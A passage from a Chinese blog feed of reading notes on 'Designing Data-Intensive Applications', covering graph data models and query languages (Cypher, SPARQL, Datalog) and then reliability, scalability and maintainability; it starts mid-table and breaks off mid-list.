</tr>
<tr class="even">
<td>抽象层，隐藏了数据引擎细节，允许数据库在兼容下引入新的特性</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>自动查询优化，利于并行优化</td>
<td>执行过程的确定性</td>
<td></td>
</tr>
<tr class="even">
<td>灵活，允许开发人员手动优化，可能会取得更好的性能</td>
<td></td>
<td></td>
</tr>
<tr class="odd">
<td>缺点</td>
<td>查询优化无法保证能获取到最优执行计划</td>
<td>复杂、可读性差、数据引擎难以优化、难以自动并行执行</td>
</tr>
</tbody>
</table>
<h3 id="声明式web查询">声明式 Web 查询</h3>
<p>web 开发中也有类似场景。</p>
<p>CSS 也是通过声明式的方式，指定向哪些元素添加什么样的样式，但并不规定这些样式的添加方式。</p>
<p>JS 语言则可以通过 DOM API 实现类似的效果，使用脚本语言强制改变 DOM 节点的样式。</p>
<p>二者对比之下：</p>
<ul>
<li>响应式：
<ul>
<li>CSS 是响应式的，意味着当符合要求的元素新增 / 消失之后，样式自动添加 / 取消</li>
<li> JS 则不是，需要通过监听事件、轮询等机制，才能实现</li>
</ul></li>
<li>性能
<ul>
<li>短期内，手动优化的 js 可能性能更好</li>
<li>但声明式的 CSS 可以持续地从浏览器对 CSS 优化中收益</li>
</ul></li>
</ul>
<p>在浏览器中，使用 CSS 声明样式是比用 JS 手动实现好得多的。在数据系统中，使用声明查询语言 SQL 也比命令式查询好得多。</p>
<h3 id="mapreduce-查询">MapReduce 查询</h3>
<p>MapReduce 是一种用于处理海量数据的编程模型，由谷歌推广。一些 NoSQL 数据库，例如 MongoDB、CouchDB 实现了一种阉割版的 NoSQL。</p>
<p>MongoDB 实现的 NoSQL 介于声明式和命令式之间，在整体声明式的框架下，存在 map 和 reduce 两个代码片段用于数据处理。map 和 reduce 必须是纯函数，内部不能执行其他的 query，这使得数据库可以灵活地以任意顺序、在任何地方执行查询，并可以安全重试。</p>
<h2 id="图数据模型">图数据模型</h2>
<p>关系模型可以处理多对多关系，但如果记录间的关系复杂且常见，使用图模型是最自然的。图模型由顶点（vertex）和边（edge）组成，适用于高端关联数据，例如：</p>
<ul>
<li>社交图：顶点为人，边为人之间的社交行为</li>
<li> web 图：顶点为网页，边为网页引用</li>
<li>路网图：顶点为连接点，边为道路</li>
</ul>
<p>图模型不仅限于存储同类（homogeneous）数据，也可以用于存储不同类型的对象。例如 Facebook 就维护了一个很大的图模型，存储了人、位置、事件、打卡、评论等数据。</p>
<p>一个例子，可以从社交网络或系谱数据库中获得：它显示了两个人，来自爱达荷州的 Lucy 和来自法国 Beaune 的 Alain。他们已婚，住在伦敦。</p>
<p><img src="fig2-5.png"></p>
<h3 id="属性图">属性图</h3>
<p>在属性图模型中，每个<strong>顶点（vertex）</strong>包括：</p>
<ul>
<li>唯一的标识符</li>
<li>一组 <strong>出边（outgoing edges）</strong></li>
<li>一组 <strong>入边（ingoing edges）</strong></li>
<li>一组属性（键值对）</li>
</ul>
<p>每条 <strong>边（edge）</strong> 包括：</p>
<ul>
<li>唯一标识符</li>
<li><strong>边的起点 / 尾部顶点（tail vertex）</strong></li>
<li><strong>边的终点 / 头部顶点（head vertex）</strong></li>
<li>描述两个顶点之间关系类型的标签</li>
<li>一组属性（键值对）</li>
</ul>
<p>在图中，<strong>起点是 tail，终点是 head：</strong></p>
<ul>
<li>边通常用箭头表示，而箭头是从「尾」指向「头」的。</li>
</ul>
<p>可以想象有两张关系表，分别存储顶点和边：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> vertices (</span><br><span class="line">  vertex_id  <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">  properties JSON</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> edges (</span><br><span class="line">  edge_id     <span class="type">INTEGER</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">  tail_vertex <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> vertices (vertex_id),</span><br><span class="line">  head_vertex <span class="type">INTEGER</span> <span class="keyword">REFERENCES</span> vertices (vertex_id),</span><br><span class="line">  label       TEXT,</span><br><span class="line">  properties  JSON</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> INDEX edges_tails <span class="keyword">ON</span> edges (tail_vertex);</span><br><span class="line"><span class="keyword">CREATE</span> INDEX edges_heads <span class="keyword">ON</span> edges (head_vertex);</span><br></pre></td></tr></tbody></table></figure>
<p>该模型的重要特征：</p>
<ul>
<li>任意两个顶点间都可以相连，没有限制</li>
<li>给定顶点，可以高效找到入边和出边，进而遍历（关系表上加了索引）</li>
<li>通过使用不同的 label，可以在表中存储多样的数据，同时保持数据模型的简洁</li>
</ul>
<p>这些特性为图模型带来了很大的灵活性。相反，如果是使用关系模型存储上面的图，就会遇到问题，例如不同国家的不同地区结构（法国有省和州，美国有不同的州和州），国中国的怪事（先忽略主权国家和国家错综复杂的烂摊子），不同的数据粒度（Lucy 现在的住所被指定为一个城市，而她的出生地点只是在一个州的级别）。</p>
<p>图模型的可演化性很好：可以持续地容纳和支持新的业务特性。</p>
<h3 id="cypher查询语言">Cypher 查询语言</h3>
<p>声明式，用于 Neo4j 图数据库，名字来自于电影，与密码学里的 cipher 无关</p>
<p>使用 cypher 创建上图的左半部分：</p>
<ul>
<li>前四行是顶点，格式：名称：类别 属性集合</li>
<li>后两行的边，格式：(顶点名) - [: 边标签] → (顶点名)…</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">CREATE</span><br><span class="line">    (NAmerica:Location {name:'North America', type:'continent'}),</span><br><span class="line">    (USA:Location      {name:'United States', type:'country'  }),</span><br><span class="line">    (Idaho:Location    {name:'Idaho',         type:'state'    }),</span><br><span class="line">    (Lucy:Person       {name:'Lucy' }),</span><br><span class="line">    (Idaho) -[:WITHIN]-&gt;  (USA)  -[:WITHIN]-&gt; (NAmerica),</span><br><span class="line">    (Lucy)  -[:BORN_IN]-&gt; (Idaho)</span><br></pre></td></tr></tbody></table></figure>
<p>如果想要查询，生于美国，居住在欧洲的人名，可以编写如下查询</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">MATCH</span></span><br><span class="line">    (person) <span class="operator">-</span>[:BORN_IN]<span class="operator">-</span><span class="operator">&gt;</span>  () <span class="operator">-</span>[:<span class="keyword">WITHIN</span><span class="operator">*</span><span class="number">0.</span>.]<span class="operator">-</span><span class="operator">&gt;</span> (us:Location {name:<span class="string">'United States'</span>}),</span><br><span class="line">    (person) <span class="operator">-</span>[:LIVES_IN]<span class="operator">-</span><span class="operator">&gt;</span> () <span class="operator">-</span>[:<span class="keyword">WITHIN</span><span class="operator">*</span><span class="number">0.</span>.]<span class="operator">-</span><span class="operator">&gt;</span> (eu:Location {name:<span class="string">'Europe'</span>})</span><br><span class="line"><span class="keyword">RETURN</span> person.name</span><br></pre></td></tr></tbody></table></figure>
<p>这是典型的声明式查询，数据库可以选择以下的执行计划：</p>
<ul>
<li>遍历所有的人，返回符合条件的人</li>
<li>从终点美国和欧洲开始，找到所有的位置，再找符合关系的人交集</li>
<li>…</li>
</ul>
<p>如果是使用关系模型存储图模型，也可以使用 SQL 进行查询，但会困难很多。因为 [:WITHIN*0..] 可以很准确简洁地描述出：沿着 WITHIN 关系 0 或者多次这一条件，而在 SQL 中，需要编写复杂的递归查询才能实现。此外，join 的次数可能也无法预知。</p>
<h3 id="三元组存储">三元组存储</h3>
<p>由三元组表示，例如（Jim, likes, bananas）</p>
<ul>
<li>主语：subject，属性图中的顶点</li>
<li>谓语：predicate</li>
<li> 宾语：object，二者之一
<ul>
<li>数据类型原始值，例如 integer、string。此时，三元组等价于属性图中的属性。</li>
<li>另一个顶点。此时谓语就是一条边。</li>
</ul></li>
</ul>
<p>RDF（Resource Description Framework）模型就使用了三元组存储，构建语义网络。虽然语义网络已经夭折了。</p>
<p>SPARQL 语言可用于查询 RDF，语法类似 Cypher，例如，查询上面的例子，生于美国，居住在欧洲的人名：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line">PREFIX : <span class="operator">&lt;</span>urn:example:<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">SELECT</span> ?personName <span class="keyword">WHERE</span> {</span><br><span class="line">  ?person :name ?personName.</span><br><span class="line">  ?person :bornIn  <span class="operator">/</span> :<span class="keyword">within</span><span class="operator">*</span> <span class="operator">/</span> :name "United States".</span><br><span class="line">  ?person :livesIn <span class="operator">/</span> :<span class="keyword">within</span><span class="operator">*</span> <span class="operator">/</span> :name "Europe".</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="对比网络模型">对比网络模型</h3>
<p>网络模型（CODASYL）和图模型看起来很像，但它们是很不同的：</p>
<ul>
<li>CODASYL 存在 schema 限制了记录间关联嵌套关系，图模型则没有，更灵活</li>
<li> CODASYL 只能通过访问路径访问记录，图模型则可以通过唯一标识符或索引值快速定位节点</li>
<li> CODASYL 中记录的子节点是有序的，这给存储、维持有序性带来了额外开销。图模型中的顶点、边都是无序的。</li>
<li>CODASYL 只支持命令式查询，复杂、容易被破坏。而图模型既支持命令式查询，也支持高级的声明式查询，例如 Cypher、SPARQL。</li>
</ul>
<h3 id="基础datalog">基础：Datalog</h3>
<p><strong>Datalog</strong> 是比 SPARQL、Cypher 更古老的语言，在 20 世纪 80 年代被学者广泛研究，为以后的查询语言提供了基础。</p>
<p>Datalog 使用类似三元组的存储，不同的是，把三元组写成 <strong>谓语</strong>（<strong>主语，宾语</strong>），例如</p>
<figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">name(namerica, <span class="string">'North America'</span>).</span><br><span class="line">type(namerica, continent).</span><br><span class="line"></span><br><span class="line">name(usa, <span class="string">'United States'</span>).</span><br><span class="line">type(usa, country).</span><br><span class="line">within(usa, namerica).</span><br><span class="line"></span><br><span class="line">name(idaho, <span class="string">'Idaho'</span>).</span><br><span class="line">type(idaho, state).</span><br><span class="line">within(idaho, usa).</span><br><span class="line"></span><br><span class="line">name(lucy, <span class="string">'Lucy'</span>).</span><br><span class="line">born_in(lucy, idaho).</span><br></pre></td></tr></tbody></table></figure>
<p>同样，查询美国移民欧洲的人：</p>
<figure class="highlight jsx"><table><tbody><tr><td class="code"><pre><span class="line">within_recursive(Location, Name) :- name(Location, Name). <span class="comment">/* Rule 1 */</span></span><br><span class="line"></span><br><span class="line">within_recursive(Location, Name) :- within(Location, Via), <span class="comment">/* Rule 2 */</span></span><br><span class="line">                  within_recursive(Via, Name).</span><br><span class="line"></span><br><span class="line">migrated(Name, BornIn, LivingIn) :- name(Person, Name), <span class="comment">/* Rule 3 */</span></span><br><span class="line">                                    born_in(Person, BornLoc),</span><br><span class="line">                                    within_recursive(BornLoc, BornIn),</span><br><span class="line">                                    lives_in(Person, LivingLoc),</span><br><span class="line">                                    within_recursive(LivingLoc, LivingIn).</span><br><span class="line"></span><br><span class="line">?- migrated(Who, <span class="string">'United States'</span>, <span class="string">'Europe'</span>). <span class="comment">/* Who = 'Lucy'. */</span></span><br></pre></td></tr></tbody></table></figure>
<p>Datalog 可以定义规则来辅助查询，类似函数，其中：</p>
<ul>
<li>大写开头的是变量名</li>
<li>谓语代表匹配规则</li>
<li>只有:- 右侧所有规则都匹配，整个规则才匹配</li>
</ul>
<p>这种定义规则的方式，虽然不如 Cypher 看起来简单直接，但对于复杂的查询，能够更好地处理。</p>
<h2 id="总结">总结</h2>
<p>数据模型是一个巨大的课题，在本章中，我们快速浏览了各种不同的模型。</p>
<p>在历史上，数据最开始被表示为一棵大树（层次数据模型），但是这不利于表示多对多的关系，所以发明了关系模型来解决这个问题。最近，开发人员发现一些应用程序也不适合采用关系模型。新的非关系型 “NoSQL” 数据存储分化为两个主要方向：</p>
<ol type="1">
<li><strong>文档数据库：</strong>主要关注自包含的数据文档，而且文档之间的关系非常稀少。</li>
<li><strong>图形数据库：</strong>用于相反的场景：任意事物之间都可能存在潜在的关联。</li>
</ol>
<p>这三种模型（文档，关系和图形）在今天都被广泛使用，并且在各自的领域都发挥很好。一个模型可以用另一个模型来模拟 —— 例如，图数据可以在关系数据库中表示 —— 但结果往往是糟糕的。这就是为什么我们有着针对不同目的的不同系统，而不是一个单一的万能解决方案。</p>
<p>文档数据库和图数据库有一个共同点，那就是它们通常不会将存储的数据强制约束为特定模式，这可以使应用程序更容易适应不断变化的需求。但是应用程序很可能仍会假定数据具有一定的结构；区别仅在于模式是<strong>明确的</strong>（写入时强制）还是<strong>隐含的</strong>（读取时处理）。</p>
<p>每个数据模型都具有各自的查询语言或框架，我们讨论了几个例子：SQL，MapReduce，MongoDB 的聚合管道，Cypher，SPARQL 和 Datalog。我们也谈到了 CSS 和 XSL/XPath，它们不是数据库查询语言，而包含有趣的相似之处。</p>
<p>虽然我们已经覆盖了很多层面，但仍然有许多数据模型没有提到。举几个简单的例子：</p>
<ul>
<li>使用基因组数据的研究人员通常需要执行 <strong>序列相似性搜索</strong>，这意味着需要一个很长的字符串（代表一个 DNA 序列），并在一个拥有类似但不完全相同的字符串的大型数据库中寻找匹配。这里所描述的数据库都不能处理这种用法，这就是为什么研究人员编写了像 GenBank 这样的专门的基因组数据库软件的原因【48】。</li>
<li>粒子物理学家数十年来一直在进行大数据类型的大规模数据分析，像大型强子对撞机（LHC）这样的项目现在会处理数百 PB 的数据！在这样的规模下，需要定制解决方案来阻止硬件成本的失控【49】。</li>
<li><strong>全文搜索</strong> 可以说是一种经常与数据库一起使用的数据模型。信息检索是一个很大的专业课题，我们不会在本书中详细介绍，但是我们将在第三章和第三部分中介绍搜索索引。</li>
</ul>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Data_model">Data model - Wikipedia</a></li>
<li><a href="https://vonng.gitbooks.io/ddia-cn/content/ch2.html">第二章：数据模型与查询语言・ddia-cn</a></li>
<li><a href="https://oi-wiki.org/graph/concept/">图论相关概念 - OI Wiki</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
        <tag>数据模型</tag>
        <tag>查询语言</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第一章：可靠性、可扩展性和可维护性</title>
    <url>/blog/2024/04/08/DDIA-Note-1/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>最近开始读设计数据密集型应用（<a href="http://shop.oreilly.com/product/0636920032175.do">《Designing Data-Intensive Applications》</a>，DDIA），记录一下自己的阅读笔记，过程中的思考，本文是第一章。</p>
<span id="more"></span>
<p>根据负载特点，应用可以简单分为：</p>
<ul>
<li>计算密集型（Compute-Intensive）：需要高算力来执行任务，例如仿真、渲染、大模型训练 &amp; 推理、高性能计算（HPC）等。
<ul>
<li>任务的瓶颈在于算力，即计算资源（cpu、gpu 等）。</li>
</ul></li>
<li>数据密集型（Data-Intensive）：以海量数据的存储、检索、分析为重点，例如数据库、其他存储组件（缓存、消息队列等）。
<ul>
<li>任务的瓶颈在于海量和 IO。</li>
</ul></li>
</ul>
<p>互联网应用，大部分都是数据密集型的。例如淘宝包含了海量商品、商家、订单、评论数据，用户的操作大部分是对这些数据的增删改查。这样的系统不仅需要能够处理亿万量级的数据，还要支持高并发、高可用、高性能，这是很有挑战的。</p>
<h2 id="数据系统">数据系统</h2>
<h3 id="通用的标准组件">通用的标准组件</h3>
<p>数据密集型应用通常由标准组件构建而成，标准组件提供了很多通用的功能；例如，许多应用程序都需要：</p>
<ul>
<li>存储数据，以便自己或其他应用程序之后能再次找到 （<em>数据库，即 databases</em>）</li>
<li>记住开销昂贵操作的结果，加快读取速度（<em>缓存，即 caches</em>）</li>
<li>允许用户按关键字搜索数据，或以各种方式对数据进行过滤（<em>搜索索引，即 search indexes</em>）</li>
<li>向其他进程发送消息，进行异步处理（<em>流处理，即 stream processing</em>）</li>
<li>定期处理累积的大批量数据（<em>批处理，即 batch processing</em>）</li>
</ul>
<p><strong>数据系统（data system）</strong> 是非常成功的抽象，为我们提供了这些通用的能力。例如 MySQL：</p>
<ul>
<li>存储数据：这是最基本的</li>
<li>缓存：8.0 之前的查询缓存，以及 Buffer Pool 中的页缓存</li>
<li>索引：B + 树索引、前缀索引</li>
</ul>
<h3 id="分类">分类</h3>
<p>通常认为，<strong>数据库、消息队列、缓存</strong>等工具分属于几个差异显著的类别。虽然数据库和消息队列表面上有一些相似性 —— 它们都会存储一段时间的数据 —— 但它们有迥然不同的<strong>访问模式</strong>，这意味着迥异的<strong>性能特征和实现手段</strong>。</p>
<p>使用数据系统这样的总称，是因为近些年来，出现了许多新的数据存储工具与数据处理工具。它们针对不同应用场景进行优化，因此不再适合生硬地归入传统类别。类别之间的界限变得越来越模糊。例如：</p>
<ul>
<li>数据存储可以被当成消息队列用（Redis）</li>
<li>消息队列则带有类似数据库的持久保证（Apache Kafka）</li>
</ul>
<p>一个典型的应用，会将总体任务拆分为一系列能被单个工具高效完成的任务，通过应用代码将他们缝合起来。例如，一个典型的架构如下：</p>
<p><img src="fig1-1.png"></p>
<h2 id="可靠性">可靠性</h2>
<h3 id="典型期望">典型期望</h3>
<p>人们对可靠软件的典型期望包括：</p>
<ul>
<li><strong>功能</strong>：应用程序表现出用户所期望的功能。</li>
<li><strong>容错</strong>：允许用户犯错，允许用户以出乎意料的方式使用软件。</li>
<li><strong>性能</strong>：在预期的负载和数据量下，性能满足要求。</li>
<li><strong>安全</strong>：系统能防止未经授权的访问和滥用。</li>
</ul>
<p>所有这些在一起意味着 “正确工作”，可以把可靠性粗略理解为 “<strong>即使出现问题，也能继续正确工作</strong>”。这里的问题是指 <strong>故障（fault）</strong>，能预料并应对故障的系统特性可称为 <strong>容错（fault-tolerant）</strong> 或 <strong>韧性（resilient）</strong>。</p>
<ul>
<li><strong>容错只对特定类型的错误才有意义，系统不可能容忍所有的错误</strong>。比如说，如果整个地球（及其上的所有服务器）都被黑洞吞噬了，想要容忍这种错误，需要把网络托管到太空中，这是显然不现实的。</li>
<li><strong>故障（fault）</strong> 不同于 <strong>失效（failure）</strong>。<strong>故障</strong> 通常定义为系统的一部分状态偏离其标准，而 <strong>失效</strong> 则是系统作为一个整体停止向用户提供服务。容错机制的目的，就是以防因 <strong>故障</strong> 而导致 <strong>失效</strong>。</li>
</ul>
<p>在容错实践中，故意 <strong>提高</strong> 故障率是有意义的，这可以确保容错机制不断运行并接受考验，从而提高故障自然发生时系统能正确处理的信心，例如 Netflix 公司的 <em>Chaos Monkey</em>。</p>
<h3 id="硬件故障">硬件故障</h3>
<p>一旦拥有很多机器，<strong>硬件故障（hardware faults）</strong>总会发生，包含：硬盘崩溃、内存出错、机房断电、有人拔错网线……</p>
<p>据报道称，硬盘的 <strong>平均无故障时间（MTTF, mean time to failure）</strong> 约为 10 到 50 年【5】【6】。因此从数学期望上讲，在拥有 10000 个磁盘的存储集群上，平均每天会有 1 个磁盘出故障。</p>
<p>硬件故障通常是随机的、相互独立的，可能有微弱的相关性：</p>
<ul>
<li>例如同一个机架上的不同机器，可能因为机架温度同时失效</li>
<li>同一个机房里的机器，可能会因为机房断电、天灾同时失效</li>
</ul>
<p>但整体还是很微弱的，同时发生故障也是极为罕见的。如果要做更高级别的可用，需要<strong>异地多副本</strong>存储，但成本也会多倍增加。</p>
<p>处理硬件故障通常会增加冗余，虽然不能根治，但简单易懂：</p>
<ul>
<li>磁盘可以组建 RAID</li>
<li> 服务器可能有双路电源和热插拔 CPU</li>
<li> 数据中心可能有电池和柴油发电机作为后备电源</li>
<li>...</li>
</ul>
<p>对大多数应用，硬件冗余完全够了。如果是高可用要求的应用，可能需要多套硬件冗余，并进一步引入完善的软件容错机制。</p>
<h3 id="软件错误">软件错误</h3>
<p>软件系统内部的 <strong>系统性错误（systematic error）</strong>。这类错误难以预料，而且因为是<strong>跨节点相关</strong>的（<strong>不同节点都运行着同样的系统</strong>），所以比起不相关的硬件故障往往可能造成更多的 <strong>系统失效</strong>【5】。例子包括：</p>
<ul>
<li>特定的错误输入，例如 2012 年 6 月 30 日的闰秒，由于 Linux 内核中的一个错误【9】，许多应用同时挂掉了。</li>
<li><strong>用尽共享资源</strong>，包括 CPU 时间、内存、磁盘空间或网络带宽。</li>
<li>系统<strong>依赖的服务变慢</strong>，没有响应，或者开始返回错误的响应。</li>
<li>级联故障，一个组件中的小故障触发另一个组件中的故障，进而触发更多的故障【10】。</li>
</ul>
<p>导致这类软件故障的 BUG 通常会潜伏很长时间，直到被异常情况触发为止。这种情况意味着<strong>软件对其环境做出了某种假设 —— 虽然这种假设通常来说是正确的，但由于某种原因最后不再成立了</strong>【11】。</p>
<p>虽然软件中的系统性故障没有速效药，但我们还是有很多小办法，例如：<strong>仔细考虑系统中的假设和交互；彻底的测试；进程隔离；允许进程崩溃并重启；测量、监控并分析生产环境中的系统行为</strong>。如果系统能够提供一些保证（例如在一个消息队列中，进入与发出的消息数量相等），那么系统就可以在运行时不断自检，并在出现 <strong>差异（discrepancy）</strong> 时报警【12】。</p>
<h3 id="人为错误">人为错误</h3>
<p>研发工程师和运维都是人类，人类是不可靠的。一项关于大型互联网服务的研究发现，<strong>运维配置错误是导致服务中断的首要原因</strong>，而硬件故障（服务器或网络）仅导致了 10-25% 的服务中断。</p>
<p>尽管人类不可靠，但怎么做才能让系统变得可靠？最好的系统会组合使用以下几种办法：</p>
<ul>
<li>以最小化犯错机会的方式<strong>设计系统</strong>。例如，精心设计的抽象、API 和管理后台使做对事情更容易，搞砸事情更困难。但如果接口限制太多，人们就会忽略它们的好处而想办法绕开。很难正确把握这种微妙的平衡。</li>
<li>将人们最容易犯错的地方与可能导致失效的地方 <strong>解耦（decouple）</strong>。特别是提供一个功能齐全的非生产环境 <strong>沙箱（sandbox）</strong>，使人们可以在不影响真实用户的情况下，使用真实数据安全地探索和实验。</li>
<li>在各个层次进行彻底的<strong>测试</strong>【3】，从单元测试、全系统集成测试到手动测试。自动化测试易于理解，已经被广泛使用，特别适合用来覆盖正常情况中少见的 <strong>边缘场景（corner case）</strong>。</li>
<li>允许从人为错误中<strong>简单快速地恢复</strong>，以最大限度地减少失效情况带来的影响。 例如，快速回滚配置变更，分批发布新代码（以便任何意外错误只影响一小部分用户），并提供数据重算工具（以备旧的计算出错）。</li>
<li><strong>配置详细和明确的监控</strong>，比如性能指标和错误率。 在其他工程学科中这指的是 <strong>遥测（telemetry）</strong>（一旦火箭离开了地面，遥测技术对于跟踪发生的事情和理解失败是至关重要的）。监控可以向我们发出预警信号，并允许我们检查是否有任何地方违反了假设和约束。当出现问题时，指标数据对于问题诊断是非常宝贵的。</li>
<li><strong>良好的管理实践与充分的培训</strong> —— 一个复杂而重要的方面，但超出了本书的范围。</li>
</ul>
<h2 id="可扩展性">可扩展性</h2>
<p>系统今天能可靠运行，并不意味未来也能可靠运行。服务 <strong>降级（degradation）</strong> 的一个常见原因是负载增加，<strong>可扩展性（Scalability）</strong> 是用来描述系统应对负载增长能力的术语。讨论可伸缩性意味着考虑诸如 “<strong>如果系统以特定方式增长，有什么选项可以应对增长？</strong>” 和 “如何增加计算资源来处理额外的负载？” 等问题。</p>
<h3 id="描述负载">描述负载</h3>
<p>负载可以用一些称为 <strong>负载参数（load parameters）</strong> 的数字来描述。参数的最佳选择取决于系统架构，它可能是：</p>
<ul>
<li>每秒向 Web 服务器发出的请求</li>
<li>数据库中的读写比率</li>
<li>聊天室中同时活跃的用户数量</li>
<li>缓存命中率</li>
<li>其他东西</li>
</ul>
<p>除此之外，也许平均值对你很重要，也许瓶颈是少数极端场景。</p>
<h3 id="描述性能">描述性能</h3>
<p>对于 Hadoop 这样的批处理系统，通常关心的是 <strong>吞吐量（throughput）</strong>，即每秒可以处理的记录数量，或者在特定规模数据集上运行作业的总时间 。对于在线系统，通常更重要的是服务的 <strong>响应时间（response time）</strong>，即客户端发送请求到接收响应之间的时间。</p>
<blockquote>
<p><strong>延迟（latency）</strong> 和 <strong>响应时间（response time）</strong> 经常用作同义词，但实际上它们并不一样。</p>
<ul>
<li><strong>响应时间</strong>是客户所看到的，除了实际处理请求的时间（ <strong>服务时间（service time）</strong> ）之外，还包括网络延迟和排队延迟。</li>
<li><strong>延迟</strong>是某个请求等待处理的 <strong>持续时长</strong>，在此期间它处于 <strong>休眠（latent）</strong> 状态，并等待服务【17】。</li>
</ul>
</blockquote>
<p>由于网络传输、系统运行的各种随机性，即使不断重复发送同样的请求，每次得到的响应时间也都会略有不同。这些随机性包括不限于：</p>
<ul>
<li>上下文切换到后台</li>
<li>网络数据包丢失与 TCP 重传</li>
<li>垃圾收集暂停</li>
<li>从磁盘读取的页面错误</li>
<li>服务器机架中的震动</li>
</ul>
<p>因此，响应时间应该被视为分布，并考察这个分布的统计值，例如：平均数、中位数、高百分位点（p95，p99）等。</p>
<p><img src="fig-1.4.png"></p>
<p>响应时间的高百分位点（也称为 <strong>尾部延迟</strong>，即 <strong>tail latencies</strong>）非常重要，因为它们直接影响用户的服务体验。例如亚马逊在描述内部服务的响应时间要求时是以 99.9 百分位点为准，即使它只影响一千个请求中的一个。这是因为请求响应最慢的客户往往也是数据最多的客户，也可以说是最有价值的客户。另一方面，优化第 99.99 百分位点（一万个请求中最慢的一个）被认为太昂贵了，不能为亚马逊的目标带来足够好处。减小高百分位点处的响应时间相当困难，因为它很容易受到随机事件的影响，这超出了控制范围，而且效益也很小。</p>
<h4 id="服务级别"><strong>服务级别</strong></h4>
<p>百分位点通常用于 <strong>服务级别目标（SLO, service level objectives）</strong> 和 <strong>服务级别协议（SLA, service level agreements）</strong>，即定义服务预期性能和可用性的合同。 SLA 可能会声明，如果服务响应时间的中位数小于 200 毫秒，且 99.9 百分位点低于 1 秒，则认为服务工作正常（如果响应时间更长，就认为服务不达标）。这些指标为客户设定了期望值，并允许客户在 SLA 未达标的情况下要求退款。SLI、SLO、SLA 具体介绍如下：</p>
<ul>
<li><strong>服务级别指标</strong>（SLI，service level indicators）：服务真实实时的指标数据，可能包括不限于：性能、响应时间、吞吐量、支持 qps、错误率等，这些指标需要能够被服务的客户认可。</li>
<li><strong>服务级别目标</strong>（SLO，service level objectives）：服务所提供功能的一种<strong>期望状态</strong>，使用 SLI 来描述，例如：99% 访问延迟 &lt; 500ms</li>
<li><strong> 服务级别协议</strong>（SLA, service level agreements）：涉及 2 方的合约，双方必须都要同意并遵守这个合约。SLA 用一个简单的公式来描述就是： SLA = SLO + 后果。需要一个通用的货币来奖励 / 惩罚，比如：钱。</li>
</ul>
<h3 id="应对负载的方法">应对负载的方法</h3>
<p>适应某个级别负载的架构不太可能应付 10 倍于此的负载。如果你正在开发一个快速增长的服务，那么每次负载发生数量级的增长时，你可能都需要重新考虑架构 —— 或者更频繁。</p>
<p>人们经常讨论和使用的方法：</p>
<ul>
<li><strong>纵向伸缩</strong>（scaling up，也称为垂直伸缩，即 vertical scaling）：转向更强大的机器</li>
<li><strong>横向伸缩</strong>（scaling out，也称为水平伸缩，即 horizontal scaling）：将负载分布到多台小机器上</li>
</ul>
<p>跨多台机器分配负载也称为 “<strong>无共享（shared-nothing）</strong>” 架构。可以在单台机器上运行的系统通常更简单，但高端机器可能非常贵，所以非常密集的负载通常无法避免地需要横向伸缩。现实世界中的优秀架构需要将这两种方法务实地结合，因为使用几台足够强大的机器可能比使用大量的小型虚拟机更简单也更便宜。</p>
<p>有些系统是 <strong>弹性（elastic）</strong> 的，这意味着可以在检测到负载增加时自动增加计算资源，而其他系统则是手动伸缩（人工分析容量并决定向系统添加更多的机器）。如果负载 <strong>极难预测（highly unpredictable）</strong>，则弹性系统可能很有用，但手动伸缩系统更简单，并且意外操作可能会更少。</p>
<h4 id="分布式">分布式</h4>
<p>跨多台机器部署 <strong>无状态服务（stateless services）</strong> 非常简单，但将带状态的数据系统从单节点变为分布式配置则可能引入许多额外复杂度。出于这个原因，常识告诉我们应该将数据库放在单个节点上（纵向伸缩），直到伸缩成本或可用性需求迫使其改为分布式。</p>
<p>随着分布式系统的工具和抽象越来越好，至少对于某些类型的应用而言，这种常识可能会改变。可以预见<strong>分布式数据系统将成为未来的默认设置</strong>，即使对不处理大量数据或流量的场景也如此。</p>
<p>没有一招鲜吃遍天的通用可伸缩架构（不正式的叫法：<strong>万金油（magic scaling sauce）</strong> ）。应用的问题可能是读取量、写入量、要存储的数据量、数据的复杂度、响应时间要求、访问模式或者所有问题的大杂烩。举个例子，用于处理每秒十万个请求（每个大小为 1 kB）的系统与用于处理每分钟 3 个请求（每个大小为 2GB）的系统看上去会非常不一样，尽管两个系统有同样的数据吞吐量。</p>
<p>一个良好适配应用的可伸缩架构，是围绕着 <strong>假设（assumption）</strong> 建立的：哪些操作是常见的？哪些操作是罕见的？这就是所谓负载参数。如果假设最终是错误的，那么为伸缩所做的工程投入就白费了，最糟糕的是适得其反。在早期创业公司或非正式产品中，通常支持产品快速迭代的能力，要比可伸缩至未来的假想负载要重要的多。</p>
<h2 id="可维护性">可维护性</h2>
<p>软件的大部分开销并不在最初的开发阶段，而是在持续的维护阶段，包括修复漏洞、保持系统正常运行、调查失效、适配新的平台、为新的场景进行修改、偿还技术债、添加新的功能等等。</p>
<p>为了使系统易于维护，考虑软件系统的三个设计原则：</p>
<ul>
<li><p>可操作性（Operability）</p>
<p>便于运维团队保持系统平稳运行。</p></li>
<li><p>简单性（Simplicity）</p>
<p>从系统中消除尽可能多的 <strong>复杂度（complexity）</strong>，使新工程师也能轻松理解系统（注意这和用户接口的简单性不一样）。</p></li>
<li><p>可演化性（evolvability）</p>
